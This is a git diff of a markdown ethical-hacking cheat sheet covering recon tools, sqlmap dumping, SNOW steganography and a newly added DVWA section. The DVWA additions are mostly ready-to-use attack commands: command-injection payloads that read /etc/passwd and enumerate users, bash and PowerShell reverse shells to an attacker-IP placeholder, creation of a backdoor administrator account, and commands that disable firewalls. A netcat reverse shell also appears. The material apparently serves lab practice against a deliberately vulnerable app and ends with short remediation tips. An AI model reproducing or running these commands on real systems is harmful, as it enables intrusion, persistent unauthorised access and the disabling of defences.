@@ -2,7 +2,8 @@
 
 [Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)
 
-#### Recon
+<details>
+<summary><b> Recon </b></summary>
   ##### via Web
   - [Tor Browser](https://www.torproject.org/download/)
   - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
@@ -19,6 +20,7 @@
   - Web extractor
   - Httrack (for mirroring website)
   - Recon-ng
+</details>
 
 #### Network Scanning
 
@@ -146,7 +148,7 @@ nikto -h url -Cgidirs all
 - openstego GUI tool (https://github.com/syvaidya/openstego/releases)
 - stegosuite
 - SNOW
-  ```
+  ````js
   SNOW.EXE -C -p 1234 output.txt   // For extracting the hidden message
   
   // Options Available in SNOW
@@ -171,7 +173,7 @@ nikto -h url -Cgidirs all
       -p It is for a password for concealing and extracting.
       input.txt The file in which you want to conceal the message within.
       output.txt The file in which you want the output.
-  ```
+  ````
 
 #### Web explotation
 [SQLmap cheetsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/sqlmap_cheatsheet.md)
@@ -198,18 +200,88 @@ Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --colum
 sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
 ````
 
+<details><summary>DVWA</summary>
+Basic Commands
+
+````bash
+  ; whoami
+  && whoami #If successful, it should return the current user (e.g., www-data in Linux).
+````
+List Files & Directories
+````bash
+  ; ls -la    #linux
+  && dir    #windows
+````
+Read Files & user info (Sensitive Info)
+````bash
+  ; cat /etc/passwd    #linux
+  ; cut -d: -f1 /etc/passwd      #View Only Usernames in above
+  && type C:\Windows\System32\drivers\etc\hosts      #windows
+  net user     #View All Users in windows
+  query user    #View Active Logged-in Users
+  net user /domain    #View Domain Users
+````
+  
+Check Network & Connections
+````bash
+  #Linux:
+  ; ifconfig
+  ; netstat -an
+  #Windows:
+  && ipconfig
+  && netstat -an
+````
+Get a Reverse Shell (Full Access)
+If outbound connections are allowed, you can get a reverse shell, with [netcat](####netcat-reverse-shell)
+````bash
+  #If nc is unavailable, try:
+  ; bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
+  
+  #Windows Reverse Shell, set up listener on Kali:
+  nc -lvnp 4444
+  #Then inject:
+  && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+````
+Create a New User
+If you have enough privileges, add a new user for persistent access.
+````bash
+  ; useradd -m hacker && echo "hacker:password" | chpasswd         #Linux
+  
+  #windows
+  && net user hacker P@ssw0rd /add
+  && net localgroup administrators hacker /add
+````
+Disable Firewalls
+````bash
+  ; iptables -F      #linux
+  && netsh advfirewall set allprofiles state off       #windows
+````
+Metasploit (If You Have a Shell)
+If you have Meterpreter access:
+````bash
+  meterpreter > getuid
+  #List all users:
+  meterpreter > run post/windows/gather/enum_users
+````
+> How to Fix the Vulnerability?
+  - Sanitize input: Use escapeshellcmd() and escapeshellarg().
+  - Whitelist commands: Only allow specific inputs.
+  - Use prepared statements: Avoid direct execution of user input.
+
+</details>
+
 #### Netcat Reverse Shell
-Victim (Windows/Linux)
-  ```
-  nc -e /bin/bash <ATTACKER-IP> 4444
-  ```
 Attacker (Listener)
   ```
   nc -lvnp 4444
   ```
+Victim (Windows/Linux)
+  ```
+  nc -e /bin/bash <ATTACKER-IP> 4444
+  ```
 
 #### Theef
-  // Server exe need to be run on victim and client exe on Attacker
+  > Server exe need to be run on victim and client exe on Attacker
 
 #### Payload detect via Anti-malware / Anti-Virus
 - Virus Total
